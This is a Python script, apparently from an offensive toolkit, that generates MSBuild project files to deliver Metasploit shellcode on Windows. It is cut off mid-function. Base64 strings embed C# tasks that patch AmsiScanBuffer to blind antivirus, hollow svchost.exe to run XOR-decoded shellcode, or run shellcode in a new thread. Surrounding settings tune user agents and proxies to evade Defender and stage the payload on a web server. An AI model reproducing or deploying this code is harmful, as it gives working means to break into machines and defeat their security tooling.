import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,cradleps1,powershell_b64encode,makeoneliner
from makerunspace import certutil_b64encode
from makedll import xor_buffer_csharp
from makefodhelper import makefodhelper,chararray

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writemsbuild(bitness,lhost,lport,ptype,binary,pscmd,remote):
    csprojfilename = "run.csproj"
    csprojwebroot = "/var/www/html/"
    #kalismbpath = "/home/kali/data/Tools/"
    #winsmbpath = "\\\\%s\\visualstudio\\tools\\%s"
    
    csprojfilepath = csprojwebroot + csprojfilename

    if ptype == "dir":
        if binary == "SharpUp":
            print ("[!] woops, dir SharpUp not developed yet. terminating!")
            sys.exit()
            pass
        if binary == "Hollow":
            print ("[!] woops, dir Hollow doesn't work, not even with simple runner. terminating!")
            sys.exit()
            '''
            upper = "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDxUYXJnZXQgTmFtZT0iSGVsbG8iPgogICAgPENsYXNzRXhhbXBsZSAvPgogIDwvVGFyZ2V0PgogIDxVc2luZ1Rhc2sKICAgIFRhc2tOYW1lPSJDbGFzc0V4YW1wbGUiCiAgICBUYXNrRmFjdG9yeT0iQ29kZVRhc2tGYWN0b3J5IgogICAgQXNzZW1ibHlGaWxlPSJDOlxXaW5kb3dzXE1pY3Jvc29mdC5OZXRcRnJhbWV3b3JrXHY0LjAuMzAzMTlcTWljcm9zb2Z0LkJ1aWxkLlRhc2tzLnY0LjAuZGxsIiA+CiAgICA8VGFzaz4KICAgICAgPENvZGUgVHlwZT0iQ2xhc3MiIExhbmd1YWdlPSJjcyI+CiAgICAgIDwhW0NEQVRBWwogICAgICAgIHVzaW5nIFN5c3RlbTsKICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CiAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLkZyYW1ld29yazsKICAgICAgICB1c2luZyBNaWNyb3NvZnQuQnVpbGQuVXRpbGl0aWVzOwogICAgICAgIHB1YmxpYyBjbGFzcyBDbGFzc0V4YW1wbGUgOiAgVGFzaywgSVRhc2sKICAgICAgICB7ICAgICAgICAgCiAgICAgICAgICBwdWJsaWMgY29uc3QgdWludCBDUkVBVEVfU1VTUEVOREVEID0gMHg0OwogICAgICAgICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTQkFTSUNJTkZPUk1BVElPTiA9IDA7CgogICAgICAgICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgICAgICAgcHVibGljIHN0cnVjdCBQcm9jZXNzSW5mbwogICAgICAgICAgewogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBQcm9jZXNzSWQ7CiAgICAgICAgICAgICAgcHVibGljIEludDMyIFRocmVhZElkOwogICAgICAgICAgfQoKICAgICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICAgIHB1YmxpYyBzdHJ1Y3QgU3RhcnR1cEluZm8KICAgICAgICAgIHsKICAgICAgICAgICAgICBwdWJsaWMgdWludCBjYjsKICAgICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WDsKICAgICAgICAgICAgICBwdWJsaWMgdWludCBkd1k7CiAgICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYU2l6ZTsKICAgICAgICAgICAgICBwdWJsaWMgdWludCBkd1lTaXplOwogICAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WENvdW50Q2hhcnM7CiAgICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICAgICAgICBwdWJsaWMgdWludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgICAgICAgcHVibGljIHVpbnQgZHdGbGFnczsKICAgICAgICAgICAgICBwdWJsaWMgc2hvcnQgd1Nob3dXaW5kb3c7CiAgICAgICAgICAgICAgcHVibGljIHNob3J0IGNiUmVzZXJ2ZWQyOwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CiAgICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkT3V0cHV0OwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwogICAgICAgICAgfQoKICAgICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgICAgICAgIGludGVybmFsIHN0cnVjdCBQcm9jZXNzQmFzaWNJbmZvCiAgICAgICAgICB7CiAgICAgICAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDE7CiAgICAgICAgICAgICAgcHVibGljIEludFB0ciBQZWJBZGRyZXNzOwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQyOwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQzOwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUGlkOwogICAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgTW9yZVJlc2VydmVkOwogICAgICAgICAgfQoKICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2kpXQogICAgICAgICAgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3Moc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLCBzdHJpbmcgbHBDb21tYW5kTGluZSwgSW50UHRyIGxwUHJvY2Vzc0F0dHJpYnV0ZXMsCiAgICAgICAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgICBbSW5dIHJlZiBTdGFydHVwSW5mbyBscFN0YXJ0dXBJbmZvLCBvdXQgUHJvY2Vzc0luZm8gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgICAgICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIENhbGxpbmdDb252ZW50aW9uID0gQ2FsbGluZ0NvbnZlbnRpb24uU3RkQ2FsbCldCiAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IFp3UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIGhQcm9jZXNzLCBpbnQgcHJvY0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgICAgICAgcmVmIFByb2Nlc3NCYXNpY0luZm8gcHJvY0luZm9ybWF0aW9uLCB1aW50IFByb2NJbmZvTGVuLCByZWYgdWludCByZXRsZW4pOwoKICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFJlYWRQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICAgICAgICBpbnQgZHdTaXplLCBvdXQgSW50UHRyIGxwTnVtYmVyT2ZieXRlc1JXKTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIGJ5dGVbXSBscEJ1ZmZlciwgSW50MzIgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgICBzdGF0aWMgZXh0ZXJuIHVpbnQgUmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkKTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50MzIgZHdTaXplLCBVSW50MzIgZmxOZXdQcm90ZWN0LCBvdXQgVUludDMyIGxwZmxPbGRQcm90ZWN0KTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBuYW1lKTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwoKICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeE51bWEoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBBZGRyZXNzLCB1aW50IGR3U2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QsIFVJbnQzMiBubmRQcmVmZXJyZWQpOwoKICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgogICAgICAgICAgcHVibGljIG92ZXJyaWRlIGJvb2wgRXhlY3V0ZSgpCiAgICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CgogICAgICAgICAgICAvL3dyZWNrIG1pbWkKICAgICAgICAgICAgc3RyaW5nIG5hbWUxID0gImEiICsgIm1zaSIgKyAiLmRsbCI7CiAgICAgICAgICAgIHN0cmluZyBuYW1lMiA9ICJBIiArICJtc2kiICsgIlNjYW5CIiArICJ1ZmZlciI7CiAgICAgICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgICAgIEludFB0ciBNaW1pUHRyID0gR2V0UHJvY0FkZHJlc3MoVGFyZ2V0RExMLCBuYW1lMik7CiAgICAgICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0ID0gMDsKICAgICAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHg0MCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoYnVmaSwgMCwgTWltaVB0ciwgYnVmaS5MZW5ndGgpOwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDIwLCBvdXQgb2xkUHJvdGVjdCk7"
            lower = "ICAgICAgICAgICAgLy8gU3RhcnQgJ3N2Y2hvc3QuZXhlJyBpbiBhIHN1c3BlbmRlZCBzdGF0ZQogICAgICAgICAgICBTdGFydHVwSW5mbyBzSW5mbyA9IG5ldyBTdGFydHVwSW5mbygpOwogICAgICAgICAgICBQcm9jZXNzSW5mbyBwSW5mbyA9IG5ldyBQcm9jZXNzSW5mbygpOwogICAgICAgICAgICBib29sIGNSZXN1bHQgPSBDcmVhdGVQcm9jZXNzKG51bGwsICJjOlxcd2luZG93c1xcc3lzdGVtMzJcXHN2Y2hvc3QuZXhlIiwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLAogICAgICAgICAgICAgICAgZmFsc2UsIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBwSW5mbyk7CgogICAgICAgICAgICAvLyBHZXQgUHJvY2VzcyBFbnZpcm9ubWVudCBCbG9jayAoUEVCKSBtZW1vcnkgYWRkcmVzcyBvZiBzdXNwZW5kZWQgcHJvY2VzcyAob2Zmc2V0IDB4MTAgZnJvbSBiYXNlIGltYWdlKQogICAgICAgICAgICBQcm9jZXNzQmFzaWNJbmZvIHBiSW5mbyA9IG5ldyBQcm9jZXNzQmFzaWNJbmZvKCk7CiAgICAgICAgICAgIHVpbnQgcmV0TGVuID0gbmV3IHVpbnQoKTsKICAgICAgICAgICAgbG9uZyBxUmVzdWx0ID0gWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwSW5mby5oUHJvY2VzcywgUFJPQ0VTU0JBU0lDSU5GT1JNQVRJT04sIHJlZiBwYkluZm8sICh1aW50KShJbnRQdHIuU2l6ZSAqIDYpLCByZWYgcmV0TGVuKTsKICAgICAgICAgICAgSW50UHRyIGJhc2VJbWFnZUFkZHIgPSAoSW50UHRyKSgoSW50NjQpcGJJbmZvLlBlYkFkZHJlc3MgKyAweDEwKTsKCiAgICAgICAgICAgIC8vIDEuIFJlYWQgZXhlY3V0YWJsZSBhZGRyZXNzIGZyb20gZmlyc3QgOCBieXRlcyAoSW50NjQsIG9mZnNldCAwKSBvZiBQRUIgYW5kIHJlYWQgZGF0YSBjaHVuayBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICAgICAgICAgIGJ5dGVbXSBwcm9jQWRkciA9IG5ldyBieXRlWzB4OF07CiAgICAgICAgICAgIGJ5dGVbXSBkYXRhQnVmID0gbmV3IGJ5dGVbMHgyMDBdOwogICAgICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICAgICAgYm9vbCByZXN1bHQgPSBSZWFkUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgYmFzZUltYWdlQWRkciwgcHJvY0FkZHIsIHByb2NBZGRyLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBJbnRQdHIgZXhlY3V0YWJsZUFkZHJlc3MgPSAoSW50UHRyKUJpdENvbnZlcnRlci5Ub0ludDY0KHByb2NBZGRyLCAwKTsKICAgICAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwoKICAgICAgICAgICAgLy8gMi4gUmVhZCB0aGUgZmllbGQgJ2VfbGZhbmV3JywgNCBieXRlcyAoVUludDMyKSBhdCBvZmZzZXQgMHgzQyBmcm9tIGV4ZWN1dGFibGUgYWRkcmVzcyB0byBnZXQgdGhlIG9mZnNldCBmb3IgdGhlIFBFIGhlYWRlcgogICAgICAgICAgICB1aW50IGVfbGZhbmV3ID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIDB4M2MpOwoKICAgICAgICAgICAgLy8gMy4gVGFrZSB0aGUgbWVtb3J5IGF0IHRoaXMgUEUgaGVhZGVyIGFkZCBhbiBvZmZzZXQgb2YgMHgyOCB0byBnZXQgdGhlIEVudHJ5cG9pbnQgUmVsYXRpdmUgVmlydHVhbCBBZGRyZXNzIChSVkEpIG9mZnNldAogICAgICAgICAgICB1aW50IHJ2YU9mZnNldCA9IGVfbGZhbmV3ICsgMHgyODsKCiAgICAgICAgICAgIC8vIDQuIFJlYWQgdGhlIDQgYnl0ZXMgKFVJbnQzMikgYXQgdGhlIFJWQSBvZmZzZXQgdG8gZ2V0IHRoZSBvZmZzZXQgb2YgdGhlIGV4ZWN1dGFibGUgZW50cnlwb2ludCBmcm9tIHRoZSBleGVjdXRhYmxlIGFkZHJlc3MKICAgICAgICAgICAgdWludCBydmEgPSBCaXRDb252ZXJ0ZXIuVG9VSW50MzIoZGF0YUJ1ZiwgKGludClydmFPZmZzZXQpOwoKICAgICAgICAgICAgLy8gNS4gR2V0IHRoZSBhYnNvbHV0ZSBhZGRyZXNzIG9mIHRoZSBlbnRyeXBvaW50IGJ5IGFkZGluZyB0aGlzIHZhbHVlIHRvIHRoZSBiYXNlIGV4ZWN1dGFibGUgYWRkcmVzcy4gU3VjY2VzcyEKICAgICAgICAgICAgSW50UHRyIGVudHJ5cG9pbnRBZGRyID0gKEludFB0cikoKEludDY0KWV4ZWN1dGFibGVBZGRyZXNzICsgcnZhKTsKCiAgICAgICAgICAgIC8vIENhcnJ5aW5nIG9uLCBkZWNvZGUgdGhlIFhPUiBwYXlsb2FkCiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgYnVmLkxlbmd0aDsgaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBidWZbaV0gPSAoYnl0ZSkoKHVpbnQpYnVmW2ldIF4gMHhmYSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vIE92ZXJ3cml0ZSB0aGUgbWVtb3J5IGF0IHRoZSBpZGVudGlmaWVkIGFkZHJlc3MgdG8gJ2hpamFjaycgdGhlIGVudHJ5cG9pbnQgb2YgdGhlIGV4ZWN1dGFibGUKICAgICAgICAgICAgcmVzdWx0ID0gV3JpdGVQcm9jZXNzTWVtb3J5KHBJbmZvLmhQcm9jZXNzLCBlbnRyeXBvaW50QWRkciwgYnVmLCBidWYuTGVuZ3RoLCBvdXQgYnl0ZXNSVyk7CgogICAgICAgICAgICAvLyBSZXN1bWUgdGhlIHRocmVhZCB0byB0cmlnZ2VyIG91ciBwYXlsb2FkCiAgICAgICAgICAgIHVpbnQgclJlc3VsdCA9IFJlc3VtZVRocmVhZChwSW5mby5oVGhyZWFkKTsKCiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgfQogICAgICAgIH0gICAgIAogICAgICBdXT4KICAgICAgPC9Db2RlPgogICAgPC9UYXNrPgogIDwvVXNpbmdUYXNrPgo8L1Byb2plY3Q+"

            #test
            upper = "PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogIDxUYXJnZXQgTmFtZT0iSGVsbG8iPgogICAgPENsYXNzRXhhbXBsZSAvPgogIDwvVGFyZ2V0PgogIDxVc2luZ1Rhc2sKICAgIFRhc2tOYW1lPSJDbGFzc0V4YW1wbGUiCiAgICBUYXNrRmFjdG9yeT0iQ29kZVRhc2tGYWN0b3J5IgogICAgQXNzZW1ibHlGaWxlPSJDOlxXaW5kb3dzXE1pY3Jvc29mdC5OZXRcRnJhbWV3b3JrXHY0LjAuMzAzMTlcTWljcm9zb2Z0LkJ1aWxkLlRhc2tzLnY0LjAuZGxsIiA+CiAgICA8VGFzaz4KICAgICAgPENvZGUgVHlwZT0iQ2xhc3MiIExhbmd1YWdlPSJjcyI+CiAgICAgIDwhW0NEQVRBWwogICAgICAgIHVzaW5nIFN5c3RlbTsKICAgICAgICB1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CiAgICAgICAgdXNpbmcgU3lzdGVtLlRleHQ7CiAgICAgICAgdXNpbmcgTWljcm9zb2Z0LkJ1aWxkLkZyYW1ld29yazsKICAgICAgICB1c2luZyBNaWNyb3NvZnQuQnVpbGQuVXRpbGl0aWVzOwogICAgICAgIHB1YmxpYyBjbGFzcyBDbGFzc0V4YW1wbGUgOiAgVGFzaywgSVRhc2sKICAgICAgICB7ICAgICAgICAgCiAgICAgICAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgTUVNX0NPTU1JVCA9IDB4MTAwMDsgICAgICAgICAgCiAgICAgICAgICBwcml2YXRlIHN0YXRpYyBVSW50MzIgUEFHRV9FWEVDVVRFX1JFQURXUklURSA9IDB4NDA7ICAgICAgICAgIAogICAgICAgICAgCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFZpcnR1YWxBbGxvYyhVSW50MzIgbHBTdGFydEFkZHIsCiAgICAgICAgICAgIFVJbnQzMiBzaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCk7ICAgICAgICAgIAogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoICAgICAgICAgICAgCiAgICAgICAgICAgIFVJbnQzMiBscFRocmVhZEF0dHJpYnV0ZXMsCiAgICAgICAgICAgIFVJbnQzMiBkd1N0YWNrU2l6ZSwKICAgICAgICAgICAgVUludDMyIGxwU3RhcnRBZGRyZXNzLAogICAgICAgICAgICBJbnRQdHIgcGFyYW0sCiAgICAgICAgICAgIFVJbnQzMiBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgICAgIHJlZiBVSW50MzIgbHBUaHJlYWRJZCAgICAgICAgICAgCiAgICAgICAgICAgICk7CiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoICAgICAgICAgICAKICAgICAgICAgICAgSW50UHRyIGhIYW5kbGUsCiAgICAgICAgICAgIFVJbnQzMiBkd01pbGxpc2Vjb25kcwogICAgICAgICAgICApOyAgCiAgICAgICAgICAgIAogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CgogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXhOdW1hKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0LCBVSW50MzIgbm5kUHJlZmVycmVkKTsKCiAgICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwoKICAgICAgICAgIHB1YmxpYyBvdmVycmlkZSBib29sIEV4ZWN1dGUoKQogICAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLi4uIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwoKICAgICAgICAgICAgLy93cmVjayBtaW1pCiAgICAgICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgICAgICBJbnRQdHIgVGFyZ2V0RExMID0gTG9hZExpYnJhcnkobmFtZTEpOwogICAgICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgICAgIEJ5dGVbXSBidWZpID0geyAweDQ4LCAweDMxLCAweEMwIH07CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOw=="
            lower = "ICAgICAgICAgICAgLy9mb3IgKGludCBpID0gMDsgaSA8IGJ1Zi5MZW5ndGg7IGkrKykKICAgICAgICAgICAgLy97CiAgICAgICAgICAgIC8vICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgLy99CiAgICAgICAgICAgIAogICAgICAgICAgICBVSW50MzIgZnVuY0FkZHIgPSBWaXJ0dWFsQWxsb2MoMCwgKFVJbnQzMilidWYuTGVuZ3RoLCBNRU1fQ09NTUlULCBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZiwgMCwgKEludFB0cikoZnVuY0FkZHIpLCBidWYuTGVuZ3RoKTsKICAgICAgICAgICAgSW50UHRyIGhUaHJlYWQgPSBJbnRQdHIuWmVybzsKICAgICAgICAgICAgVUludDMyIHRocmVhZElkID0gMDsKICAgICAgICAgICAgSW50UHRyIHBpbmZvID0gSW50UHRyLlplcm87CiAgICAgICAgICAgIGhUaHJlYWQgPSBDcmVhdGVUaHJlYWQoMCwgMCwgZnVuY0FkZHIsIHBpbmZvLCAwLCByZWYgdGhyZWFkSWQpOwogICAgICAgICAgICBXYWl0Rm9yU2luZ2xlT2JqZWN0KGhUaHJlYWQsIDB4RkZGRkZGRkYpOwogICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICB9CiAgICAgICAgfSAgICAgCiAgICAgIF1dPgogICAgICA8L0NvZGU+CiAgICA8L1Rhc2s+CiAgPC9Vc2luZ1Rhc2s+CjwvUHJvamVjdD4="

            gen(lhost,lport,bitness,"csharp")
            msffilename = "met%s.csharp" % (bitness)
            m = open(msffilename,'r')
            msf = m.read()
            m.close()
            #msf = xor_buffer_csharp(msf) # 5/26 -defender

            with open(csprojfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + msf + "\n")
                f.write(lower)
                f.close()
            '''
            pass
        if binary == "UACHelper":
            print ("[!] woops, dir UACHelper doesn't work, msbuild can't find fodhelper process. terminating!")
            sys.exit()
            '''
